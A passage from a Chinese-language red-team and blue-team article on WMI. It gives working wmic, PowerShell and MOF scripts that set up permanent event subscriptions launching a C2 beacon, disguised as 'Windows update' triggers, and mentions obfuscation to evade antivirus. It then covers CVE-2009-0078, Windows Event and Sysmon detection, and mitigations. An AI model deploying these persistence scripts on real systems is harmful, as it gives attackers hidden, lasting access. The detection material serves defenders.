    Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='事件消费者名'" | Remove-WmiObject -Verbose
    #删除事件绑定
    Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%事件绑定名%'" | Remove-WmiObject -Verbose
删除事件过滤器
删除事件消费者
删除事件绑定
###  WMI永久事件
> ***注意**
> ：没有指定时间轮询则需要机器重启才可以进行WMI轮询，需要注意的一点是，WMI可以任意指定触发条件，例如用户退出，某个程序创建，结束等等*。
**wmic添加永久事件**
    #注册一个 WMI 事件过滤器
    wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BugSecFilter", EventNamespace = "root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __TimerEvent WITHIN 10 WHERE TimerID = 'BugSecFilter'"
    #注册一个 WMI 事件消费者
    wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BugSecConsumer", CommandLineTemplate="cmd.exe /c  c:\beacon.exe"
    #将事件消费者绑定到事件过滤器
    wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter='\\.\root\subscription:__EventFilter.Name="BugSecFilter"', Consumer='\\.\root\subscription:CommandLineEventConsumer.Name="BugSecConsumer"'
**Powershell添加永久事件**
> ***注意** ：可以考虑添加Powershell的时间间隔器，需要上线至C2则将Payload替换成C2的exe或者dll或者ps1即可。*
>
> ***注意** ：需要修改一下参数*
    IntervalBetweenEvents ###修改间隔时间，以毫秒为单位。
    $EventFilterArgs 中的 Name ###修改筛选器名称。
    Query ###修改其中WQL语句，以下脚本中可不用修改，但TimerID需和$TimerArgs中的参数匹配。
    $FinalPayload ###修改Payload，可以指定执行Powershell，或者cmd或者其他命令。
    $CommandLineConsumerArgs 中的 Name ###修改消费者名称。
    $TimerArgs = @{
     IntervalBetweenEvents = ([UInt32] 2000) # 30 min
     SkipIfPassed = $False
     TimerId ="Trigger" };
    $EventFilterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = "Windows update trigger"
    Query = "SELECT * FROM __TimerEvent WHERE TimerID = 'Trigger'"
    QueryLanguage = 'WQL' };
    $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs;
    $FinalPayload = 'cmd.exe /c c:\beacon.exe'
    $CommandLineConsumerArgs = @{
     Name = "Windows update consumer"
     CommandLineTemplate = $FinalPayload};
    $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs;
    $FilterToConsumerArgs = @{
     Filter = $Filter
     Consumer = $Consumer};
    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs;
> ***注意**
> ：上述脚本出现的WQL语句，也可以指定WITHIN来指定间隔时间，以秒为单位，但是需提前指定TimerID，可以自行修改PS1脚本进行完善，将添加后门、删除后门的操作集成到一个脚本内完成，同时免杀的操作可以针对性的进行混淆或编码的操作。*
    SELECT * FROM __TimerEvent WITHIN 10 WHERE TimerID = 'Trigger'
**上线C2**
> ***注意**
> ：将上述Powershell脚本替换其执行的Payload进行本地执行，另存为ps1格式并修改其轮询的时间。若想做成远程下载格式，则需要将Powershell做好免杀的操作。*
运行ps1脚本后成功上线
**Mof文件添加事件**
> ***注意** ：笔者在测试Mof文件添加事件时，编译后的确能够正常添加事件，但是未能执行指定命令。*
    #PRAGMA NAMESPACE ("\\\\.\\root\\subscription")
    instance of CommandLineEventConsumer as $Cons
    {
        Name = "test1comsumer";
        RunInteractively=false;
        CommandLineTemplate="cmd.exe /c c:\beacon.exe";
    };
    instance of __EventFilter as $Filt
    {
        Name = "test1filter";
        EventNamespace = "root\\cimv2";
        Query ="SELECT * FROM __TimerEvent  WITHIN 10 WHERE TimerID = 'test1filter'";
        QueryLanguage = "WQL";
    };
    instance of __FilterToConsumerBinding
    { 
         Filter = $Filt;
         Consumer = $Cons;
    };
编译
    mofcomp.exe wmi.mof
事件添加成功
**本文参考文章：**
[WMI](https://github.com/AxelPotato/WMI)
## WMI利用（权限提升）
###  讲在前面：
WMI用作权限提升这一块笔者能力有限，未能搜集到更多的信息，只发现一个较为原始的漏洞CVE-2009-0078漏洞，较为原始，能力有限，不做细致分析。
###  CVE-2009-0078
**简介** ：Microsoft Windows XP SP2 和 SP3、Server 2003 SP1 和 SP2、Vista Gold 和 SP1
以及 Server 2008 中的 Windows Management Instrumentation (WMI)
提供程序没有在一组不同的进程之间正确实现隔离，同一用户下运行的两个独立进程可以完全访问对方的文件句柄、注册表项等资源。WMI
提供程序主机在某些情况下会使用系统令牌，如果攻击者可以以网络服务或本地服务访问访问，攻击者就执行代码探索系统令牌的
WMI提供程序主机进程。找到了SYSTEM令牌，就可以进入SYSTEM级的提升了  
**简单的来说就是WMI未能做好进程之间使用的帐户（特指NetworkService和LocalService帐户）隔离，而导致可以利用这一特性来进行提权。**  
 **笔者未能复现**
###  本文参考文章：
  * [CVE-2009-0078](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0078)
  * [WMI服务隔离本地提权漏洞](https://www.anquanke.com/vul/id/1117574)
## WMI攻击检测
###  讲在前面：
无论何种攻击手法在日志或流量是都会留下一定的痕迹，但是使用何种的规则将其监控到，这是令防守方头大的问题。WMI横向移动、权限维持都会在日志监控到。至于如何制定规则，本文不展开。  
 **总之两点：**
  * 做好 WMI 连接的网络流量监控，一般不使用 WMI 的环境若出现了使用 WMI的情况，则内部网络可能已经被入侵。
  * 做好进程监控，监测”wmic.exe“的命令行参数及其执行的命令。
###  日志检测
> ***注意**
> ：在日志检测中，最重要的数据来源就是Windows日志，而Windows日志也不是说全部选项都开启就可以，因为必须要考虑到机器本身的性能，很多无关紧要的日志数据我们可以将其监控选项关闭。*
**Windows EventLog**
Windows中对于WMIC的检测有两个关键日志：
  * EventCode 4648 — 尝试使用显式凭据登录
  * EventCode 4688 / SysmonID​​ 1 — 进程创建 (wmic.exe)
wmic执行命令  
在域内客户机上执行wmic远程命令
wmic创建事件  
当创建wmi事件时出现了4648和4688日志
4648日志出现，调用程序svchost.exe
当wmic执行时，以上述例子为例，可以看到命令执行成功前后出现了3个日志，这也和wmic的执行流程有关，我们可以参考下图：
上图咱们可以结合WMI讲解篇进行理解，WMIC操作时会先由svchost.exe调用WmiPrvSE.exe然后由WmiPrvSE调用指定的程序，指定的cmd则由cmd.exe进行下一步操作，指定的powershell则有powershell.exe进行下一步操作。
**Sysmon**
> ***注意**
> ：Sysmon是微软对于Eventlog的补充解决方案，这是笔者对于Sysmon的理解，Sysmon可以能够获取到Evenlog获取不到的更多信息，MS解释Sysmon。*
    sysmon64.exe -i exampleSysmonConfig.xml       //执行安装：
    sysmon64.exe -u                               //删除
执行安装
删除
> ***注意** ：exampleSysmonConfig.xml为Sysmon的配置文件，内容和名字均可以自定义，内容可以自行进行增加或修改。*
        verclsid.exe
        svchost.exe
             0x1F0FFF
             0x1F1FFF
             0x1F2FFF
             0x1F3FFF
             0x1FFFFF
             unknown
***参考配置文件** ：[sysmonconfig-export.xml](https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml) _  
 _*Powershell查看Sysmon日志__
    Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational
**本地事件管理器：**  
Windows日志->应用程序和服务日志->Microsoft->Windows
可以看到详细的日志内容
若是需要将sysmon的日志导出则可以使用wevtutil命令：
    wevtutil query-events "Microsoft-Windows-Sysmon/Operational" /format:xml /e:sysmonview > eventlog.xml
然后可以自行导入sysmon帮助工具进行分析：  
[sysmontools](https://github.com/nshalabi/SysmonTools)
若是权限维持中的WMI事件，则sysmon可以关注如下四个事件ID
    Process Create(ID 1)
    WmiEventFilter(ID 19)
    WmiEventConsumer(ID 20)
    WmiEventConsumterToFilter(ID 21)
可以看到CommandLine中执行的命令细节
###  流量检测
我们要注意在使用PSEXEC，SC.EXE，或其他远程服务管理工具进行操作时，通信将通过MS-SCMR协议操作DCERPC。即使该协议使用最大加密级别，但仍然可以使用流量监控确定目标执行了哪些类型的操作（例如服务创建、服务启动等）。  
下图为sc.exe 创建远程服务的 wireshark 捕获
尽管WMIC仍然基于 DCEPC，但所有 WMI DCOM
方法调用都是通过单个接口完成的，并且当与“数据包隐私”级别的加密相结合时，流量监控的解决方案只能知道调用了某些 WMI
方法。无法知道执行了那些细节操作。若通过 WINRM 协议执行时，WMI 流量看起来像 HTTP，并且再次与通过 SVCCTL 接口时完全不同。这意味着
WMI技术可以有效地规避任何流量检测其横向移动的操作。  
下图为DCEPRC数据包
###  缓解措施：
  * 限制 WinRM信任的主机数量
    winrm 设置 winrm/config/client '@{TrustedHosts="指定主机"}'
  * 在日志中重点监控WmiPrvSE.exe和WMIC.exe。
  * 做好高权限的控制，避免高权限帐户滥用。
###  参考文章：
  * [Windows 管理规范](https://attack.mitre.org/techniques/T1047/)
  * [WMI检测详细分析](https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-200902020333.html#hunter-notes)
  * [发现横向移动](https://labs.f-secure.com/blog/attack-detection-fundamentals-discovery-and-lateral-movement-lab-5/)
## WMI（技术总结及个人建议）
###  总结：
WMI在笔者所参与的项目中发现目前攻防中利用依旧非常频繁，尤其在横向移动中，利用wmic或者powershell的WMI模块操作Win32来达到渗透的目的。笔者在学习了WMI后，将其分为四个模块（讲解、横向移动、权限维持、权限提升），并追加了小知识点的编写（WBEMTEST工具使用，普通用户使用wmic）。笔者能力有限，在几篇中若有未讲人话之处，望谅解。
###  个人建议：
实际攻防中将常用的wmic命令集成到Cna插件中，将权限维持集成到Cna插件中，wmic或powershell的WMI模块常用的记好笔记，用的时候直接复制粘贴。